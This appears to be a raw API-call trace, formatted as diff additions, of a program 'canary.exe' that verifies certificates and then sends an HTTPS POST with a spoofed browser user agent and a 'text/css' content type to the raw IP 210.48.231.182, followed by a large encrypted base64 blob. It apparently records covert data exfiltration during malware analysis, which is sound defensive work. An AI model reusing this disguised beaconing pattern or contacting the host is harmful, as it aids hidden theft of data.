+[INF] [ Called from Native Image DLL ]
+[API] <CertEnumCertificatesInStore> in [CRYPT32.dll] 
+[PAR] HCERTSTORE     hCertStore       : 0x000000263FE60A40
+[PAR] PCCERT_CONTEXT pPrevCertContext : 0x000000263FE6F4D0
+[RET] 0x7ffa2bc0705d in [System.ni.dll]
+
+[CNT] [161]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertCloseStore> in [CRYPT32.dll] 
+[PAR] HCERTSTORE hCertStore : 0x000000263FE60A40
+[PAR] DWORD      dwFlags    : 0x0 
+[RET] 0x7ffa2bc06e7d in [System.ni.dll]
+
+[CNT] [162]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertFreeCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FE6F4D0
+[RET] 0x7ffa2bc01b28 in [System.ni.dll]
+
+[CNT] [163]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertOpenStore> in [CRYPT32.dll] 
+[PAR] LPCSTR            lpszStoreProvider : 0x2 (CERT_STORE_PROV_MEMORY)
+[PAR] DWORD             dwEncodingType    : 0x10001 (X509_ASN_ENCODING | PKCS_7_ASN_ENCODING)
+[PAR] HCRYPTPROV_LEGACY hCryptProv        : 0x0
+[PAR] DWORD             dwFlags           : 0x2204 (CERT_STORE_DEFER_CLOSE_UNTIL_LAST_FREE_FLAG | CERT_STORE_ENUM_ARCHIVED_FLAG | CERT_STORE_CREATE_NEW_FLAG)
+[PAR] const void        *pvPara           : 0x0
+[RET] 0x7ffa2bc07268 in [System.ni.dll]
+
+[CNT] [164]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertAddCTLLinkToStore> in [CRYPT32.dll] 
+[PAR] HCERTSTORE     hCertStore       : 0x000000263FE61260
+[PAR] PCCRL_CONTEXT  pCrlContext      : 0x000000263FE6F4D0
+[PAR] DWORD          dwAddDisposition : 0x4 (CERT_STORE_ADD_ALWAYS)
+[PAR] PCCRL_CONTEXT  *ppStoreContext  : 0x0
+[RET] 0x7ffa2bc073b6 in [System.ni.dll]
+
+[CNT] [165]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertGetCertificateChain> in [CRYPT32.dll] 
+[PAR] HCERTCHAINENGINE     hChainEngine     : 0x0
+[PAR] PCCERT_CONTEXT       pCertContext     : 0x000000263FE6F4D0
+[PAR] LPFILETIME           pTime            : 0x000000263FD2D790
+[PAR] HCERTSTORE           hAdditionalStore : 0x000000263FE61260
+[PAR] PCERT_CHAIN_PARA     pChainPara       : 0x000000263FD2D5A8
+[PAR] DWORD                dwFlags          : 0x0
+[PAR] LPVOID               pvReserved       : 0x0
+[PAR] PCCERT_CHAIN_CONTEXT *ppChainContext  : 0x000000263FD2D598
+[RET] 0x7ffa2bc076a9 in [System.ni.dll]
+
+[CNT] [166]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertDuplicateCertificateChain> in [CRYPT32.dll] 
+[PAR] PCCERT_CHAIN_CONTEXT pChainContext : 0x000000263FE60BE0
+[RET] 0x7ffa2bc0787c in [System.ni.dll]
+
+[CNT] [167]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertDuplicateCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FE6F4D0
+[FLD]                -> dwCertEncodingType = 0x1 (X509_ASN_ENCODING)
+[FLD]                -> pbCertEncoded      = 0x000000265AF65500
+[FLD]                -> pCertInfo          = 0x000000263FE19250
+[FLD]                -> hCertStore         = 0x000000263FE60A40
+[RET] 0x7ffa2bc06db2 in [System.ni.dll]
+
+[CNT] [168]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertFreeCertificateChain> in [CRYPT32.dll] 
+[RET] 0x7ffa2bc07135 in [System.ni.dll]
+
+[CNT] [169]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertVerifyCertificateChainPolicy> in [CRYPT32.dll] 
+[PAR] LPCSTR                    pszPolicyOID  : 0x1 (CERT_CHAIN_POLICY_BASE)
+[PAR] PCCERT_CHAIN_CONTEXT      pChainContext : 0x000000263FE60BE0
+[PAR] PCERT_CHAIN_POLICY_PARA   pPolicyPara   : 0x000000263FE60BE0
+[PAR] PCERT_CHAIN_POLICY_STATUS pPolicyStatus : 0x000000263FE60BE0
+[RET] 0x7ffa2bc079bc in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <CertVerifyCertificateChainPolicy>
+[RES] BOOL 0x1
+
+[CNT] [170]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertVerifyCertificateChainPolicy> in [CRYPT32.dll] 
+[PAR] LPCSTR                    pszPolicyOID  : 0x4 (CERT_CHAIN_POLICY_SSL)
+[PAR] PCCERT_CHAIN_CONTEXT      pChainContext : 0x000000263FE60BE0
+[PAR] PCERT_CHAIN_POLICY_PARA   pPolicyPara   : 0x000000263FE60BE0
+[PAR] PCERT_CHAIN_POLICY_STATUS pPolicyStatus : 0x000000263FE60BE0
+[RET] 0x7ffa2bbffb9f in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <CertVerifyCertificateChainPolicy>
+[RES] BOOL 0x1
+
+[CNT] [171]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertFreeCertificateChain> in [CRYPT32.dll] 
+[RET] 0x7ffa2bc07135 in [System.ni.dll]
+
+[CNT] [172]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <CertFreeCertificateContext> in [CRYPT32.dll] 
+[PAR] PCCERT_CONTEXT pCertContext : 0x000000263FE6F4D0
+[RET] 0x7ffa2bc06cd8 in [System.ni.dll]
+
+[CNT] [173]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <SealMessage> in [SSPICLI.DLL] 
+[PAR] LSA_SEC_HANDLE ContextHandle         : 0x0000002641968E08
+[PAR] ULONG          QualityOfProtection   : 0x0
+[PAR] PSecBufferDesc MessageBuffers        : 0x000000264196AFB8
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264196AFE0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x5
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x000000264196AD90
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0xec
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264196AD95
+[STR]                   -> "POST / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71"
+[STR]                      ".0.3578.98 Safari/537.36\r\nContent-Type: text/css\r\nHost: 210.48.231.182\r\nContent-Length: 1172\r\nExpect: 100-contin"
+[STR]                      "ue\r\n\r\n"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x24
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x000000264196AE81
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] ULONG          MessageSequenceNumber : 0x0
+[RET] 0x7ffa2bc07b87 in [System.ni.dll]
+
+[CNT] [174]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSASend> in [WS2_32.dll] 
+[PAR] SOCKET                             s                   : 0x3d0
+[PAR] LPWSABUF                           lpBuffers           : 0x000000263FE5DE50
+[FLD]                                    -> Buffers[0]
+[FLD]                                    -> len = 0x3b
+[FLD]                                    -> buf = 0x0000002641969578
+[FLD]                                    -> Buffers[1]
+[FLD]                                    -> len = 0x115
+[FLD]                                    -> buf = 0x000000264196AD90
+[PAR] DWORD                              dwBufferCount       : 0x2
+[PAR] LPDWORD                            lpNumberOfBytesSent : 0x000000263FD2E0D8
+[PAR] DWORD                              dwFlags             : 0x0
+[PAR] LPWSAOVERLAPPED                    lpOverlapped        : 0x0
+[PAR] LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine : 0x0
+[RET] 0x7ffa2bc03a51 in [System.ni.dll]
+
+[CNT] [175]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x000000264196B198
+[FLD]               -> socket_0 = 0x00000000000003D0
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x000000263FD2E2C8
+[RET] 0x7ffa2bc0386a in [System.ni.dll]
+
+[CNT] [176]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <setsockopt> in [WS2_32.dll] 
+[PAR] SOCKET s       : 0x3d0
+[PAR] int    level   : 0xffff (SOL_SOCKET)
+[PAR] int    optname : 0x1006 (SO_RCVTIMEO)
+[PAR] char   *optval : 0x000000263FD2E2B8
+[PAR] int    optlen  : 0x4
+[RET] 0x7ffa2bc03721 in [System.ni.dll]
+
+[CNT] [177]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x000000264196B1C0
+[PAR] int    len    : 0x5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [178]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x3d0
+[PAR] char   *buf   : 0x000000264196B1E5
+[PAR] int    len    : 0x30
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+[CNT] [179]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <DecryptMessage> in [SSPICLI.DLL] 
+[PAR] PCtxtHandle    phContext    : 0x0000002641968E08
+[PAR] PSecBufferDesc pMessage     : 0x000000264196B328
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264196B350
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x35
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264196B1E0
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] unsigned long  MessageSeqNo : 0x0
+[PAR] unsigned long* pfQOP        : 0x0
+[RET] 0x7ffa2bc07c7d in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <DecryptMessage>
+[PAR] PSecBufferDesc pMessage     : 0x0000000400000000
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264196B350
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x5
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x000000264196B1E0
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x19
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264196B1E5
+[STR]                   -> "HTTP/1.1 100 Continue\r\n\r\n"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x17
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x000000264196B1FE
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[CNT] [180]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <SealMessage> in [SSPICLI.DLL] 
+[PAR] LSA_SEC_HANDLE ContextHandle         : 0x0000002641968E08
+[PAR] ULONG          QualityOfProtection   : 0x0
+[PAR] PSecBufferDesc MessageBuffers        : 0x000000264196BBB8
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x000000264196BBE0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x5
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x000000264196B5E8
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x494
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x000000264196B5ED
+[STR]                   -> "33LsSjRx9ol5YkqmodSOmsbDFEVoa6Bg7m8ViAQcFTYoKcrC7Qkw+8q61orrRpKInOnGIrpkGTgfVD9SEnBaZAZEGPm1HmvDjP2KfhrU0Q9K3wEPnwI/fBdo"
+[STR]                      "I0anYCW1G3JNR4nO+XkhR+mFXP9R6Aamv8tWOYk8mTnoFa98qYRiUfBRN22wZHqqbXOz9UkWb88kMPetwyFkoFgbSmmkAz0YGJ9VmnB4cqIMzW3tV7mf/1YW"
+[STR]                      "e0OyXvqpTmdAWBoCoN2UGdh3vO/ZcF1/v4Id+H8pewjEk1fX1uSEnmWUT8BHH7oC1AYHIobTBkXKoNBAA3t42sFykmIlK2BrzyzHY38fcmEcYIY9Qs/Ue7Dc"
+[STR]                      "xdo4YWDZHA3gHwvRx4cMK17ugYHzK1Lvi9oL1vjhi4fgpxPYNACDVZ8JJ5Ie7k7Yx5GGmDfskTeErEIMDxCni7V4WdqPSXMaRtvAGtC4XesRq2nlFmVYF57P"
+[STR]                      "U7eYV38UBhtiWE+TWkXkrx2GgygP/jRbUt4HjF5gHKbfVV9oU/dG0wD98XCR0bPVRoCRiIHxVqHuGdENSx7xqguIhKmwLG2RZTKhPefliMHjdb8D2ZOgrnbU"
+[STR]                      "V0eslre6cMhAARtqWyCP02GmJp63kuDSfYHgVzTQytHw72aBmsHb+vUBmpLIgZBswvfvDpVOz42t568E1eLbsEQxfAcr/ZIrwkXrvpMbTXiAh3lOdkSFOCjb"
+[STR]                      "1LWbhvIUsXVKaQXJCFSJ962MobLA0WMoovMe8RWz9xjhL5I+N6xqD+pvGXOVUgUF3Dz6pFQA8oDQOV+maGaq6ekXmRJeDL6HBbJrcXupTDfQfl2BmujE9HCb"
+[STR]                      "WuPZ/eU4m6chDHWjTy1haBN2sObaLFM+ei1c0VWcnyC6vXbHz7z9wh4g5pCAe7iBJVaDKOaNWuywz8a28zv/QC2iHKDscOajaOrNmKdfH82p4DwNbkjWTaE4"
+[STR]                      "dfR6E79pWqDoEuLlyIkv6fJ6kBbIO8Nf40Zk/ZxU/zRbozZniuWXpVLNKDtgPM5aUlbyfSanEwp33D1nRWF2qbkWkLJikdvzBkJguquBQCuiv4n4r+s/LPVM"
+[STR]                      "WK7PVRnSEjRcQCr67aEeyqccYIOyJoDRz5WiVYhqIvS/UhTeS/iShix3StCITNZ1lDeNXvaP8J/N30iv2qMT/hD6+vlz"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x24
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x000000264196BA81
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0000000000000000
+[PAR] ULONG          MessageSequenceNumber : 0x0
+[RET] 0x7ffa2bc07b87 in [System.ni.dll]
+
+[CNT] [181]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x3d0
+[PAR] char   *buf : 0x000000264196B5E8
+[PAR] int    len  : 0x4b5
+[RET] 0x7ffa2bc0360f in [System.ni.dll]
+
+
+
